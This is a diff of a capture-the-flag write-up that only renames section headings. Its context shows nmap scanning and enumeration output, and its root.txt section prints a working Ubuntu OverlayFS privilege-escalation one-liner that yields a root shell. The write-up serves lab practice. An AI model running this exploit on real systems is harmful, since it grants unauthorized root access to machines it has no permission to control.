@@ -1,6 +1,6 @@
-# #1 Introduction
+# Introduction
 
-# #2 nmap
+# Nmap
 
 we first add a domain in /etc/hosts so we don't need to remember the IP
 ```bash
@@ -21,7 +21,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-# #3 user.txt
+# user.txt
 
 ## HTTP (port 80)
 
@@ -44,7 +44,7 @@ ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = 
 ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                                                            
 runc was found in /usr/bin/runc, you may be able to escalate privileges with it 
 
-# #4 root.txt
+# root.txt
 https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability
 
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
